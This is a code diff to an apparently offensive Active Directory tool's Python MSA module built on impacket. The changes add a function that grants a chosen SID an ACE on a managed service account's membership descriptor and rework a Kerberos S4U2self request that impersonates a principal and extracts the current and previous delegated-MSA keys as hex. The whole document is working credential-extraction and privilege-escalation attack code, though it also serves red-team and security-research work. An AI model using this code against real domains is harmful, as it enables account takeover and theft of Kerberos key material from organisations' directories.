@@ -10,11 +10,9 @@ from pyasn1.codec.der import decoder, encoder
 from pyasn1.type.univ import noValue
 from pyasn1.type import tag
 
-from powerview.lib.krb5.asn1 import S4UUserID, PA_S4U_X509_USER, PA_DMSA_KEY_PACKAGE
-from powerview.lib.krb5.constants import PreAuthenticationDataTypes
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
-    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart
+    Ticket as TicketAsn1, EncTGSRepPart, PA_PAC_OPTIONS, EncTicketPart, S4UUserID, PA_S4U_X509_USER, KERB_DMSA_KEY_PACKAGE
 from impacket.krb5.crypto import _enctype_table, _get_checksum_profile, Cksumtype
 from impacket.krb5.kerberosv5 import sendReceive
 from impacket.krb5.types import Principal, KerberosTime, Ticket
@@ -42,7 +40,14 @@ class MSA:
 		sd = AccessControl.create_empty_sd()
 		acl = AccessControl.create_ace(principal_sid)
 		sd['Dacl'].aces.append(acl)
-		return sd.getData() 
+		return sd.getData()
+
+	@staticmethod
+	def add_msamembership(secDesc: bytes, principal_sid: str):
+		sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDesc)
+		acl = AccessControl.create_ace(principal_sid)
+		sd['Dacl'].aces.append(acl)
+		return sd.getData()
 
 	@staticmethod
 	def set_hidden_secdesc(sec_desc: bytes, whitelisted_sids: list[str]):
@@ -58,7 +63,7 @@ class MSA:
 		return sd.getData()
 
 	@staticmethod
-	def request_dmsa_st(tgt, cipher, oldSessionKey, sessionKey,kdcHost, domain, dmsa):
+	def doDMSA(tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, domain, impersonate):
 		decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
 		# Extract the ticket from the TGT
 		ticket = Ticket()
@@ -106,13 +111,13 @@ class MSA:
 
 		tgsReq['padata'] = noValue
 		tgsReq['padata'][0] = noValue
-		tgsReq['padata'][0]['padata-type'] = int(PreAuthenticationDataTypes.PA_TGS_REQ.value)
+		tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
 		tgsReq['padata'][0]['padata-value'] = encodedApReq
 
 		# In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
 		# requests a service ticket to itself on behalf of a user. The user is
 		# identified to the KDC by the user's name and realm.
-		clientName = Principal(dmsa, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+		clientName = Principal(impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
 		paencoded = None
 		padatatype = None
@@ -148,7 +153,7 @@ class MSA:
 		pa_s4u_x509_user['checksum']['cksumtype'] = Cksumtype.SHA1_AES256
 		pa_s4u_x509_user['checksum']['checksum'] = checkSum
 
-		padatatype = int(PreAuthenticationDataTypes.PA_S4U_X509_USER.value)
+		padatatype = int(constants.PreAuthenticationDataTypes.PA_S4U_X509_USER.value)
 		paencoded = encoder.encode(pa_s4u_x509_user)
 
 		tgsReq['padata'][1] = noValue
@@ -197,31 +202,30 @@ class MSA:
 				padata_type = int(padata_entry['padata-type'])
 				logging.debug('Found encrypted padata type: %d (0x%x)' % (padata_type, padata_type))
 				
-				if padata_type == PreAuthenticationDataTypes.PA_DMSA_KEY_PACKAGE.value:
+				if padata_type == constants.PreAuthenticationDataTypes.KERB_DMSA_KEY_PACKAGE.value:
 					dmsa_key_package = decoder.decode(
 						padata_entry['padata-value'], 
-						asn1Spec=PA_DMSA_KEY_PACKAGE()
+						asn1Spec=KERB_DMSA_KEY_PACKAGE()
 					)[0]
-					dmsa_key_package.prettyPrint()
 					
-					logging.info('Current keys:')
+					logging.debug('Current keys:')
 					for key in dmsa_key_package['current-keys']:
 						key_type = int(key['keytype'])
 						key_value = bytes(key['keyvalue'])
 						type_name = constants.EncryptionTypes(key_type)
 						hex_key = binascii.hexlify(key_value).decode('utf-8')
-						logging.info('%s:%s' % (type_name, hex_key))
-					logging.info('Previous keys:')
+						logging.debug('%s:%s' % (type_name, hex_key))
+					logging.debug('Previous keys:')
 					previous_keys = []
 					for key in dmsa_key_package['previous-keys']:
 						key_type = int(key['keytype'])
 						key_value = bytes(key['keyvalue'])
 						type_name = constants.EncryptionTypes(key_type)
 						hex_key = binascii.hexlify(key_value).decode('utf-8')
-						logging.info('%s:%s' % (type_name, hex_key))
+						#print('%s:%s' % (type_name, hex_key))
 						previous_keys.append({type_name : hex_key})
 		except Exception as e:
-			logging.error(f"Error requesting DMSA ST: {e}")
-			return None, None, None, None, None
+			import traceback
+			traceback.print_exc()
 
 		return r, None, sessionKey, None, previous_keys
